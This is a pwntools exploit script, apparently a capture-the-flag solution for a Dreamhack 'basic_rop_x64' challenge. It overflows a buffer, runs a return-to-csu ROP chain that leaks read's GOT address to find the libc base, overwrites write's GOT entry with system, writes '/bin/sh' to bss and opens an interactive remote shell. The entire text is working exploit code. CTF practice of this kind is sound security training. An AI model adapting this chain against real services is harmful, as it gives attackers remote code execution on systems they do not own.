from pwn import *

buf_ret_offset = 0x48
#rdi_pop = 0x400883
#rsi_r15_pop = 0x400881
first_chain = 0x40087A
second_chain = 0x400860
context.log_level = 'debug'
p = remote("host1.dreamhack.games", 11110)
libc = ELF("./libc.so.6")
e = ELF("./basic_rop_x64")

def RTChain(func_got, arg1, arg2, arg3):
    ret = p64(0) #rbx
    ret += p64(1) #rbp #for consecutive execution
    ret += p64(func_got)
    ret += p64(arg3)
    ret += p64(arg2)
    ret += p64(arg1)
    ret += p64(second_chain)
    return ret

read_got = e.got['read']
write_got = e.got['write']
read_offset = libc.symbols['read']
bss = e.bss()
system_offset = libc.symbols['system']
payload = 'a'*buf_ret_offset
payload += p64(first_chain)
payload += RTChain(write_got, 1, read_got, 8)
payload += 'a'* 8 # add rsp, 8
payload += RTChain(read_got, 0, bss, 8)
payload += 'a' * 8
payload += RTChain(read_got, 0, write_got, 8)
payload += 'a' * 8
payload += RTChain(write_got, bss, 0, 0)
p.send(payload)

dummy = p.recv(0x40)

read_addr = u64(p.recv(8))

libc_base = read_addr - read_offset
system = libc_base + system_offset
p.send('/bin/sh')
p.send(p64(system))

p.interactive()